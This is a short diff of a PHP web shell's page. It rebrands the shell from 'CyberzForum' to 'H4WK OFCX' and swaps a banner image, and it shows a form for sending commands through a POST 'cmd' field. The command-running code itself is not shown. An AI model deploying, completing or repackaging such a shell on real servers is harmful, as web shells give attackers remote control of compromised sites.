@@ -22,7 +22,7 @@ if (!empty($_POST['cmd'])) {
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>CyberzForum WebShell</title>
+    <title>H4WK OFCX WebShell</title>
 </head>
 <body>
     <style>
@@ -110,9 +110,9 @@ h2{
   color: red;
 }
 </style>
-<a>CyberzForum Web Shell</a>
+<a>H4WK OFCX Web Shell</a>
 <h2>Komut Çalıştır - Execute a command </h2>
-<img src="https://i.ibb.co/XDWSHsK/standard.gif"></img>
+<img src="https://i.ibb.co/x1BH2MP/standard-1.gif"></img>
         <form method="post">
             <label for="cmd"><strong>Command</strong></label>
             <div class="form-group">
